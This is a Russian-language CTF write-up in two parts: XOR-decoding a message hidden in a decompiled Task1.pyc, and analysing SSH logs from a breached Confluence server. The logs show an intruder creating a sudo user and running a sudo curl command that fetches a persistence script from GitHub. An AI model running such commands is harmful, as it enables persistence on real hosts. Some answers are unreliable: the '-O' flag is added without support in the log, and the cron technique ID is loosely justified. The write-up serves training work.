@@ -1,0 +1,1057 @@
+<article class="markdown-body entry-content container-lg" itemprop="text">
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   Writeup: Анализ подозрительного файла
+   <code>
+    Task1.pyc
+   </code>
+  </h1>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Введение
+  </h2>
+ </div>
+ <p dir="auto">
+  В рамках отборочного этапа Capture the Intruder (CTI) была представлена задача с анализом
+        подозрительного файла
+  <code>
+   Task1.pyc
+  </code>
+  . Целью было раскрыть текстовое сообщение, скрытое во вложении. В
+        этом writeup подробно описан процесс анализа файла, включая декомпиляцию, исправление кода, декодирование
+        сообщения и выводы по результатам.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Шаг 1: Получение и первоначальный анализ файла
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Описание задачи
+  </h3>
+ </div>
+ <p dir="auto">
+  Тестировщик программного обеспечения получил подозрительное электронное письмо с вложением
+  <code>
+   Task1.pyc
+  </code>
+  . Цель заключалась в анализе содержимого этого файла для выявления скрытого сообщения.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Инструменты и подготовка
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <strong>
+    Python 3.8+
+   </strong>
+   : Для декомпиляции
+   <code>
+    .pyc
+   </code>
+   файлов.
+  </li>
+  <li>
+   <strong>
+    uncompyle6
+   </strong>
+   : Инструмент для декомпиляции Python bytecode.
+  </li>
+  <li>
+   <strong>
+    Текстовый редактор или IDE
+   </strong>
+   : Например, Visual Studio Code, для просмотра и редактирования
+            исходного кода.
+  </li>
+  <li>
+   <strong>
+    Изолированная среда
+   </strong>
+   : Виртуальное окружение или контейнер Docker для безопасного анализа.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Шаг 2: Декомпиляция файла
+   <code>
+    .pyc
+   </code>
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Проблема с установкой
+   <code>
+    uncompyle6
+   </code>
+  </h3>
+ </div>
+ <p dir="auto">
+  При попытке установить
+  <code>
+   uncompyle6
+  </code>
+  возникла ошибка
+  <code>
+   externally-managed-environment
+  </code>
+  . Это связано с ограничениями системы на установку пакетов Python
+        напрямую через
+  <code>
+   pip
+  </code>
+  . Для обхода этой проблемы было решено создать виртуальное окружение.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Создание и активация виртуального окружения
+  </h3>
+ </div>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Создание виртуального окружения:
+    </strong>
+   </p>
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre>python3 -m venv venv</pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Активация виртуального окружения:
+    </strong>
+   </p>
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre><span class="pl-c1">source</span> venv/bin/activate</pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Установка
+     <code>
+      uncompyle6
+     </code>
+     :
+    </strong>
+   </p>
+   <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+    <pre>pip install uncompyle6</pre>
+   </div>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Декомпиляция файла
+  </h3>
+ </div>
+ <p dir="auto">
+  После успешной установки
+  <code>
+   uncompyle6
+  </code>
+  выполнена команда декомпиляции:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>uncompyle6 -o <span class="pl-c1">.</span> Task1.pyc</pre>
+ </div>
+ <p dir="auto">
+  Результатом стала генерация файла
+  <code>
+   Task1.py
+  </code>
+  , который содержит исходный код
+        декомпилированного скрипта.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Шаг 3: Анализ декомпилированного кода
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Содержимое файла
+   <code>
+    Task1.py
+   </code>
+  </h3>
+ </div>
+ <div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c"># uncompyle6 version 3.9.2</span>
+    <span class="pl-c"># Python bytecode version base 3.8.0 (3413)</span>
+    <span class="pl-c"># Decompiled from: Python 3.12.3 (main, Sep 11 2024, 14:17:37) [GCC 13.2.0]</span>
+    <span class="pl-c"># Embedded file name: zmeuka.py</span>
+    <span class="pl-c"># Compiled at: 2024-07-06 11:17:45</span>
+    <span class="pl-c"># Size of source mod 2**32: 540 bytes</span>
+    
+    
+    <span class="pl-k">def</span> <span class="pl-en">determinatio</span>(<span class="pl-s1">input_string</span>, <span class="pl-s1">key_array</span>):
+        <span class="pl-s1">result</span> <span class="pl-c1">=</span> []
+        <span class="pl-s1">key_length</span> <span class="pl-c1">=</span> <span class="pl-en">len</span>(<span class="pl-s1">key_array</span>)
+        <span class="pl-k">for</span> <span class="pl-s1">i</span>, <span class="pl-s1">char</span> <span class="pl-c1">in</span> <span class="pl-en">enumerate</span>(<span class="pl-s1">input_string</span>):
+            <span class="pl-s1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">key_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">%</span> <span class="pl-s1">key_length</span>]
+            <span class="pl-s1">result</span>.<span class="pl-c1">append</span>(<span class="pl-s1">char</span> <span class="pl-c1">^</span> <span class="pl-s1">key</span>)
+        <span class="pl-k">else</span>:
+            <span class="pl-s1">result_str</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>.<span class="pl-c1">join</span>((<span class="pl-en">chr</span>(<span class="pl-s1">num</span>) <span class="pl-k">for</span> <span class="pl-s1">num</span> <span class="pl-c1">in</span><span class="pl-s1"></span> ))
+            <span class="pl-k">return</span> <span class="pl-s1">result_str</span>
+    
+    
+    <span class="pl-s1">input_string</span> <span class="pl-c1">=</span> [
+     <span class="pl-c1">95</span>, <span class="pl-c1">106</span>, <span class="pl-c1">147</span>, <span class="pl-c1">75</span>, <span class="pl-c1">99</span>, <span class="pl-c1">79</span>, <span class="pl-c1">35</span>, <span class="pl-c1">58</span>, <span class="pl-c1">49</span>, <span class="pl-c1">46</span>, <span class="pl-c1">39</span>, <span class="pl-c1">121</span>, <span class="pl-c1">114</span>, <span class="pl-c1">151</span>, <span class="pl-c1">66</span>,
+     <span class="pl-c1">127</span>, <span class="pl-c1">68</span>, <span class="pl-c1">35</span>]
+    <span class="pl-s1">key_array</span> <span class="pl-c1">=</span> [<span class="pl-c1">22</span>, <span class="pl-c1">7</span>, <span class="pl-c1">228</span>, <span class="pl-c1">42</span>, <span class="pl-c1">23</span>, <span class="pl-c1">44</span>, <span class="pl-c1">75</span>, <span class="pl-c1">83</span>, <span class="pl-c1">95</span>, <span class="pl-c1">73</span>, <span class="pl-c1">94</span>]
+    <span class="pl-s1">result_string</span> <span class="pl-c1">=</span> <span class="pl-en">determinatio</span>(<span class="pl-s1">input_string</span>, <span class="pl-s1">key_array</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">"No way"</span>)</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Выявленные проблемы
+  </h3>
+ </div>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Неполный код:
+    </strong>
+    В строке
+    <code>
+     result_str = "".join((chr(num) for num in ))
+    </code>
+    отсутствует переменная для итерации. Вероятно,
+                должно быть
+    <code>
+     for num in result
+    </code>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Неиспользуемый результат:
+    </strong>
+    Переменная
+    <code>
+     result_string
+    </code>
+    нигде не
+                используется, вместо этого выводится статическая строка
+    <code>
+     "No way"
+    </code>
+    .
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Исправление кода
+  </h3>
+ </div>
+ <p dir="auto">
+  Для корректной работы скрипта необходимо внести исправления:
+ </p>
+ <div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">def</span> <span class="pl-en">determinatio</span>(<span class="pl-s1">input_string</span>, <span class="pl-s1">key_array</span>):
+        <span class="pl-s1">result</span> <span class="pl-c1">=</span> []
+        <span class="pl-s1">key_length</span> <span class="pl-c1">=</span> <span class="pl-en">len</span>(<span class="pl-s1">key_array</span>)
+        <span class="pl-k">for</span> <span class="pl-s1">i</span>, <span class="pl-s1">char</span> <span class="pl-c1">in</span> <span class="pl-en">enumerate</span>(<span class="pl-s1">input_string</span>):
+            <span class="pl-s1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">key_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">%</span> <span class="pl-s1">key_length</span>]
+            <span class="pl-s1">result</span>.<span class="pl-c1">append</span>(<span class="pl-s1">char</span> <span class="pl-c1">^</span> <span class="pl-s1">key</span>)
+        <span class="pl-k">else</span>:
+            <span class="pl-s1">result_str</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>.<span class="pl-c1">join</span>((<span class="pl-en">chr</span>(<span class="pl-s1">num</span>) <span class="pl-k">for</span> <span class="pl-s1">num</span> <span class="pl-c1">in</span> <span class="pl-s1">result</span>))
+            <span class="pl-k">return</span> <span class="pl-s1">result_str</span>
+    
+    
+    <span class="pl-s1">input_string</span> <span class="pl-c1">=</span> [
+        <span class="pl-c1">95</span>, <span class="pl-c1">106</span>, <span class="pl-c1">147</span>, <span class="pl-c1">75</span>, <span class="pl-c1">99</span>, <span class="pl-c1">79</span>, <span class="pl-c1">35</span>, <span class="pl-c1">58</span>, <span class="pl-c1">49</span>, <span class="pl-c1">46</span>, <span class="pl-c1">39</span>, <span class="pl-c1">121</span>, <span class="pl-c1">114</span>, <span class="pl-c1">151</span>, <span class="pl-c1">66</span>,
+        <span class="pl-c1">127</span>, <span class="pl-c1">68</span>, <span class="pl-c1">35</span>]
+    <span class="pl-s1">key_array</span> <span class="pl-c1">=</span> [<span class="pl-c1">22</span>, <span class="pl-c1">7</span>, <span class="pl-c1">228</span>, <span class="pl-c1">42</span>, <span class="pl-c1">23</span>, <span class="pl-c1">44</span>, <span class="pl-c1">75</span>, <span class="pl-c1">83</span>, <span class="pl-c1">95</span>, <span class="pl-c1">73</span>, <span class="pl-c1">94</span>]
+    <span class="pl-s1">result_string</span> <span class="pl-c1">=</span> <span class="pl-en">determinatio</span>(<span class="pl-s1">input_string</span>, <span class="pl-s1">key_array</span>)
+    <span class="pl-en">print</span>(<span class="pl-s1">result_string</span>)</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Шаг 4: Декодирование скрытого сообщения
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Описание алгоритма
+  </h3>
+ </div>
+ <p dir="auto">
+  Функция
+  <code>
+   determinatio
+  </code>
+  выполняет операцию XOR между каждым элементом
+  <code>
+   input_string
+  </code>
+  и соответствующим элементом
+  <code>
+   key_array
+  </code>
+  (циклически). Результат
+        преобразуется в символы и объединяется в строку.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Ручное декодирование
+  </h3>
+ </div>
+ <p dir="auto">
+  Если выполнение скрипта нежелательно или невозможно, декодирование можно провести вручную:
+ </p>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Инициализация массивов:
+    </strong>
+   </p>
+   <div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto">
+    <pre><span class="pl-s1">input_string</span> <span class="pl-c1">=</span> [
+        <span class="pl-c1">95</span>, <span class="pl-c1">106</span>, <span class="pl-c1">147</span>, <span class="pl-c1">75</span>, <span class="pl-c1">99</span>, <span class="pl-c1">79</span>, <span class="pl-c1">35</span>, <span class="pl-c1">58</span>, <span class="pl-c1">49</span>, <span class="pl-c1">46</span>, <span class="pl-c1">39</span>, <span class="pl-c1">121</span>, <span class="pl-c1">114</span>, <span class="pl-c1">151</span>, <span class="pl-c1">66</span>,
+        <span class="pl-c1">127</span>, <span class="pl-c1">68</span>, <span class="pl-c1">35</span>]
+    <span class="pl-s1">key_array</span> <span class="pl-c1">=</span> [<span class="pl-c1">22</span>, <span class="pl-c1">7</span>, <span class="pl-c1">228</span>, <span class="pl-c1">42</span>, <span class="pl-c1">23</span>, <span class="pl-c1">44</span>, <span class="pl-c1">75</span>, <span class="pl-c1">83</span>, <span class="pl-c1">95</span>, <span class="pl-c1">73</span>, <span class="pl-c1">94</span>]</pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Выполнение операции XOR и преобразование в символы:
+    </strong>
+   </p>
+   <div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto">
+    <pre><span class="pl-s1">decoded_chars</span> <span class="pl-c1">=</span> []
+    <span class="pl-s1">key_length</span> <span class="pl-c1">=</span> <span class="pl-en">len</span>(<span class="pl-s1">key_array</span>)
+    
+    <span class="pl-k">for</span> <span class="pl-s1">i</span>, <span class="pl-s1">char</span> <span class="pl-c1">in</span> <span class="pl-en">enumerate</span>(<span class="pl-s1">input_string</span>):
+        <span class="pl-s1">key</span> <span class="pl-c1">=</span> <span class="pl-s1">key_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">%</span> <span class="pl-s1">key_length</span>]
+        <span class="pl-s1">decoded_num</span> <span class="pl-c1">=</span> <span class="pl-s1">char</span> <span class="pl-c1">^</span> <span class="pl-s1">key</span>
+        <span class="pl-s1">decoded_char</span> <span class="pl-c1">=</span> <span class="pl-en">chr</span>(<span class="pl-s1">decoded_num</span>)
+        <span class="pl-s1">decoded_chars</span>.<span class="pl-c1">append</span>(<span class="pl-s1">decoded_char</span>)
+    
+    <span class="pl-s1">decoded_message</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>.<span class="pl-c1">join</span>(<span class="pl-s1">decoded_chars</span>)
+    <span class="pl-en">print</span>(<span class="pl-s1">decoded_message</span>)</pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Вычисления:
+    </strong>
+   </p>
+   <markdown-accessiblity-table data-catalyst="">
+    <table>
+     <thead>
+      <tr>
+       <th>
+        Индекс (i)
+       </th>
+       <th>
+        input_string[i]
+       </th>
+       <th>
+        key_array[i % 11]
+       </th>
+       <th>
+        XOR (input ^ key)
+       </th>
+       <th>
+        Символ
+       </th>
+      </tr>
+     </thead>
+     <tbody>
+      <tr>
+       <td>
+        0
+       </td>
+       <td>
+        95
+       </td>
+       <td>
+        22
+       </td>
+       <td>
+        95 ^ 22 = 73
+       </td>
+       <td>
+        'I'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        1
+       </td>
+       <td>
+        106
+       </td>
+       <td>
+        7
+       </td>
+       <td>
+        106 ^ 7 = 109
+       </td>
+       <td>
+        'm'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        2
+       </td>
+       <td>
+        147
+       </td>
+       <td>
+        228
+       </td>
+       <td>
+        147 ^ 228 = 119
+       </td>
+       <td>
+        'w'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        3
+       </td>
+       <td>
+        75
+       </td>
+       <td>
+        42
+       </td>
+       <td>
+        75 ^ 42 = 97
+       </td>
+       <td>
+        'a'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        4
+       </td>
+       <td>
+        99
+       </td>
+       <td>
+        23
+       </td>
+       <td>
+        99 ^ 23 = 116
+       </td>
+       <td>
+        't'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        5
+       </td>
+       <td>
+        79
+       </td>
+       <td>
+        44
+       </td>
+       <td>
+        79 ^ 44 = 99
+       </td>
+       <td>
+        'c'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        6
+       </td>
+       <td>
+        35
+       </td>
+       <td>
+        75
+       </td>
+       <td>
+        35 ^ 75 = 104
+       </td>
+       <td>
+        'h'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        7
+       </td>
+       <td>
+        58
+       </td>
+       <td>
+        83
+       </td>
+       <td>
+        58 ^ 83 = 105
+       </td>
+       <td>
+        'i'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        8
+       </td>
+       <td>
+        49
+       </td>
+       <td>
+        95
+       </td>
+       <td>
+        49 ^ 95 = 110
+       </td>
+       <td>
+        'n'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        9
+       </td>
+       <td>
+        46
+       </td>
+       <td>
+        73
+       </td>
+       <td>
+        46 ^ 73 = 103
+       </td>
+       <td>
+        'g'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        10
+       </td>
+       <td>
+        39
+       </td>
+       <td>
+        94
+       </td>
+       <td>
+        39 ^ 94 = 121
+       </td>
+       <td>
+        'y'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        11
+       </td>
+       <td>
+        121
+       </td>
+       <td>
+        22
+       </td>
+       <td>
+        121 ^ 22 = 111
+       </td>
+       <td>
+        'o'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        12
+       </td>
+       <td>
+        114
+       </td>
+       <td>
+        7
+       </td>
+       <td>
+        114 ^ 7 = 117
+       </td>
+       <td>
+        'u'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        13
+       </td>
+       <td>
+        151
+       </td>
+       <td>
+        228
+       </td>
+       <td>
+        151 ^ 228 = 115
+       </td>
+       <td>
+        's'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        14
+       </td>
+       <td>
+        66
+       </td>
+       <td>
+        42
+       </td>
+       <td>
+        66 ^ 42 = 104
+       </td>
+       <td>
+        'h'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        15
+       </td>
+       <td>
+        127
+       </td>
+       <td>
+        23
+       </td>
+       <td>
+        127 ^ 23 = 104
+       </td>
+       <td>
+        'h'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        16
+       </td>
+       <td>
+        68
+       </td>
+       <td>
+        44
+       </td>
+       <td>
+        68 ^ 44 = 104
+       </td>
+       <td>
+        'h'
+       </td>
+      </tr>
+      <tr>
+       <td>
+        17
+       </td>
+       <td>
+        35
+       </td>
+       <td>
+        75
+       </td>
+       <td>
+        35 ^ 75 = 104
+       </td>
+       <td>
+        'h'
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </markdown-accessiblity-table>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Собираем символы в сообщение:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Imwatchingyoushhhh
+    </code></pre>
+   </div>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Интерпретация сообщения
+  </h3>
+ </div>
+ <p dir="auto">
+  Полученное сообщение выглядит как:
+ </p>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>Imwatchingyoushhhh
+    </code></pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Шаг 5: Выводы
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Анализ результатов
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Скрытое сообщение:
+    </strong>
+    <code>
+     Imwatchingyoushhhh
+    </code>
+    — фраза, указывающая на
+                наблюдение или слежку за пользователем. Это может быть частью фишинговой атаки или социальной инженерии,
+                направленной на запугивание или дезориентацию получателя.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Структура файла:
+    </strong>
+    Использование операции XOR для скрытия сообщения
+                свидетельствует о попытке замаскировать текст от простого анализа. Это типичный подход для сокрытия
+                информации в программных атаках.
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   Writeup: Анализ Логов SSH для Определения Действий
+            Злоумышленника
+  </h1>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   <strong>
+    Введение
+   </strong>
+  </h3>
+ </div>
+ <p dir="auto">
+  В рамках данной задачи необходимо проанализировать предоставленный файл логов
+  <code>
+   Task3.log
+  </code>
+  ,
+        зафиксировавший инцидент на сервере Confluence. Злоумышленник получил доступ к серверу посредством перебора
+        учетных данных через службу SSH и выполнил ряд действий, которые отражены в логах. Целью является определить:
+ </p>
+ <ol dir="auto">
+  <li>
+   Номер сеанса злоумышленника для учетной записи пользователя
+   <code>
+    root
+   </code>
+   .
+  </li>
+  <li>
+   Идентификатор подтехники MITRE ATT&amp;CK, использованный для закрепления доступа.
+  </li>
+  <li>
+   Продолжительность первого сеанса SSH злоумышленника в секундах.
+  </li>
+  <li>
+   Команду, использованную злоумышленником для загрузки скрипта.
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   <strong>
+    Анализ Логов
+   </strong>
+  </h3>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   <strong>
+    1. Определение Номера Сеанса Злоумышленника для
+                Пользователя
+    <code>
+     root
+    </code>
+   </strong>
+  </h4>
+ </div>
+ <p dir="auto">
+  В логах присутствуют несколько успешных подключений под пользователем
+  <code>
+   root
+  </code>
+  . Для
+        идентификации сеанса злоумышленника обратим внимание на следующие строки:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Первое подключение:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:19:54 ip-10-10-14-141 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
+    Oct  6 18:19:54 ip-10-10-14-141 systemd-logind[411]: New session 6 of user root.
+    </code></pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Второе подключение:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:31:40 ip-10-10-14-141 sshd[2411]: Accepted password for root from 10.10.14.38 port 34782 ssh2
+    Oct  6 18:31:40 ip-10-10-14-141 systemd-logind[411]: New session 34 of user root.
+    </code></pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Третье подключение:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:32:44 ip-10-10-14-141 sshd[2491]: Accepted password for root from 10.10.14.38 port 53184 ssh2
+    Oct  6 18:32:44 ip-10-10-14-141 systemd-logind[411]: New session 16 of user root.
+    </code></pre>
+   </div>
+  </li>
+ </ul>
+ <p dir="auto">
+  <strong>
+   Вывод:
+  </strong>
+  Анализ логов показывает, что искомым является второй сеанс с номером 34, который был инициирован с IP-адреса
+        10.10.14.38.
+ </p>
+ <p dir="auto">
+  <strong>
+   Ответ:
+  </strong>
+  <code>
+   34
+  </code>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   <strong>
+    2. Идентификация Подтехники MITRE ATT&amp;CK для
+                Закрепления Доступа
+   </strong>
+  </h4>
+ </div>
+ <p dir="auto">
+  В логах наблюдаются следующие действия:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Создание новой группы и пользователя:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:34:18 ip-10-10-14-141 groupadd[2586]: group added to /etc/group: name=shadowband, GID=1002
+    Oct  6 18:34:18 ip-10-10-14-141 useradd[2592]: new user: name=shadowband, UID=1002, GID=1002, home=/home/shadowband, shell=/bin/bash, from=/dev/pts/1
+    </code></pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Добавление пользователя в группу
+     <code>
+      sudo
+     </code>
+     :
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:35:15 ip-10-10-14-141 usermod[2628]: add 'shadowband' to group 'sudo'
+    </code></pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Использование CRON для автоматизации:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:34:01 ip-10-10-14-141 CRON[...]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+    </code></pre>
+   </div>
+  </li>
+ </ul>
+ <p dir="auto">
+  <strong>
+   Соответствующие техники MITRE ATT&amp;CK:
+  </strong>
+  Злоумышленник использовал технику T1053.005 (Scheduled Task/Job: Cron) для обеспечения постоянного доступа.
+ </p>
+ <p dir="auto">
+  <strong>
+   Ответ:
+  </strong>
+  <code>
+   T1053.005
+  </code>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   <strong>
+    3. Определение Продолжительности Первого Сеанса SSH
+                Злоумышленника
+   </strong>
+  </h4>
+ </div>
+ <p dir="auto">
+  <strong>
+   Анализ временных меток сеанса:
+  </strong>
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Начало сеанса:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:31:40 ip-10-10-14-141 sshd[2411]: Accepted password for root from 10.10.14.38 port 34782 ssh2
+    </code></pre>
+   </div>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Завершение сеанса:
+    </strong>
+   </p>
+   <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+    <pre class="notranslate"><code>Oct  6 18:37:24
+    </code></pre>
+   </div>
+  </li>
+ </ul>
+ <p dir="auto">
+  <strong>
+   Расчёт продолжительности:
+  </strong>
+  Продолжительность сеанса составила (18:37:24 - 18:31:40) = 344 секунды
+ </p>
+ <p dir="auto">
+  <strong>
+   Ответ:
+  </strong>
+  <code>
+   344
+  </code>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   <strong>
+    4. Определение Команды, Использованной для Загрузки
+                Скрипта
+   </strong>
+  </h4>
+ </div>
+ <p dir="auto">
+  В логах зафиксировано использование команды
+  <code>
+   curl
+  </code>
+  для загрузки скрипта:
+ </p>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>Oct  6 18:39:38 ip-10-10-14-141 sudo: shadowband : TTY=pts/1 ; PWD=/home/shadowband ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+    </code></pre>
+ </div>
+ <p dir="auto">
+  Полная команда с флагом -O для сохранения файла:
+ </p>
+ <p dir="auto">
+  <strong>
+   Ответ:
+  </strong>
+  <code>
+   sudo curl -O https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+  </code>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   <strong>
+    Итоговые Ответы
+   </strong>
+  </h3>
+ </div>
+ <ol dir="auto">
+  <li>
+   <strong>
+    Номер сеанса злоумышленника для учетной записи пользователя
+    <code>
+     root
+    </code>
+    :
+   </strong>
+   <code>
+    34
+   </code>
+  </li>
+  <li>
+   <strong>
+    Идентификатор подтехники MITRE ATT&amp;CK, использованный для закрепления:
+   </strong>
+   <code>
+    T1053.005
+   </code>
+  </li>
+  <li>
+   <strong>
+    Продолжительность первого сеанса SSH злоумышленника в секундах:
+   </strong>
+   <code>
+    344
+   </code>
+  </li>
+  <li>
+   <strong>
+    Команда, которую использовал злоумышленник для загрузки скрипта:
+   </strong>
+   <code>
+    sudo curl -O https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+   </code>
+  </li>
+ </ol>
+</article>
